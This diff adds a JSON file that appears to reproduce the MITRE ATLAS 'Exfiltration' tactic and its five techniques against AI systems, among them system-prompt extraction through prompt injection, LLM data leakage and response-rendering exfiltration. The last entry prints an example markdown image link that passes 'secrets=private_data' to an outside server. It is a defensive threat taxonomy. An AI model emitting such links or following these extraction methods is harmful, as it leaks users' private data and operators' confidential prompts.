@@ -1,0 +1,79 @@
+{
+  "tactic": {
+    "id": "AML.TA0010",
+    "name": "Exfiltration",
+    "description": "The adversary is trying to steal AI artifacts or other information about the AI system.\n\nExfiltration consists of techniques that adversaries may use to steal data from your network.\nData may be stolen for its valuable intellectual property, or for use in staging future operations.\n\nTechniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.",
+    "object-type": "tactic",
+    "created_date": "2022-01-24",
+    "modified_date": "2025-04-09",
+    "ATT&CK-reference": {
+      "id": "TA0010",
+      "url": "https://attack.mitre.org/tactics/TA0010/"
+    }
+  },
+  "summary": {
+    "total_techniques": 5,
+    "main_techniques": 5,
+    "subtechniques": 0
+  },
+  "techniques": {
+    "main_techniques": [
+      {
+        "id": "AML.T0024",
+        "name": "Exfiltration via AI Inference API",
+        "description": "Adversaries may exfiltrate private information via [AI Model Inference API Access](/techniques/AML.T0040).\nAI Models have been shown leak private information about their training data (e.g.  [Infer Training Data Membership](/techniques/AML.T0024.000), [Invert AI Model](/techniques/AML.T0024.001)).\nThe model itself may also be extracted ([Extract AI Model](/techniques/AML.T0024.002)) for the purposes of [AI Intellectual Property Theft](/techniques/AML.T0048.004).\n\nExfiltration of information relating to private training data raises privacy concerns.\nPrivate training data may include personally identifiable information, or other protected data.",
+        "object-type": "technique",
+        "tactics": [
+          "AML.TA0010"
+        ],
+        "created_date": "2021-05-13",
+        "modified_date": "2025-04-09"
+      },
+      {
+        "id": "AML.T0025",
+        "name": "Exfiltration via Cyber Means",
+        "description": "Adversaries may exfiltrate AI artifacts or other information relevant to their goals via traditional cyber means.\n\nSee the ATT&CK [Exfiltration](https://attack.mitre.org/tactics/TA0010/) tactic for more information.",
+        "object-type": "technique",
+        "tactics": [
+          "AML.TA0010"
+        ],
+        "created_date": "2021-05-13",
+        "modified_date": "2025-04-09"
+      },
+      {
+        "id": "AML.T0056",
+        "name": "Extract LLM System Prompt",
+        "description": "Adversaries may attempt to extract a large language model's (LLM) system prompt. This can be done via prompt injection to induce the model to reveal its own system prompt or may be extracted from a configuration file.\n\nSystem prompts can be a portion of an AI provider's competitive advantage and are thus valuable intellectual property that may be targeted by adversaries.",
+        "object-type": "technique",
+        "tactics": [
+          "AML.TA0010"
+        ],
+        "created_date": "2023-10-25",
+        "modified_date": "2025-03-12"
+      },
+      {
+        "id": "AML.T0057",
+        "name": "LLM Data Leakage",
+        "description": "Adversaries may craft prompts that induce the LLM to leak sensitive information.\nThis can include private user data or proprietary information.\nThe leaked information may come from proprietary training data, data sources the LLM is connected to, or information from other users of the LLM.\n",
+        "object-type": "technique",
+        "tactics": [
+          "AML.TA0010"
+        ],
+        "created_date": "2023-10-25",
+        "modified_date": "2023-10-25"
+      },
+      {
+        "id": "AML.T0077",
+        "name": "LLM Response Rendering",
+        "description": "An adversary may get a large language model (LLM) to respond with private information that is hidden from the user when the response is rendered by the user's client. The private information is then exfiltrated. This can take the form of rendered images which automatically make a request to an adversary controlled server, or clickable links which require user interaction.\n\nFor example, an LLM may produce the following markdown:\n```\n![ATLAS](https://atlas.mitre.org/image.png?secrets=private_data)\n```\n\nWhich is rendered by the client as:\n```\n<img src=\"https://atlas.mitre.org/image.png?secrets=private_data\">\n```\n\nWhen the request is received by the adversary's server hosting the requested image, they receive the contents of the `secrets` query parameter.",
+        "object-type": "technique",
+        "tactics": [
+          "AML.TA0010"
+        ],
+        "created_date": "2025-04-15",
+        "modified_date": "2025-04-22"
+      }
+    ],
+    "subtechniques": []
+  }
+}
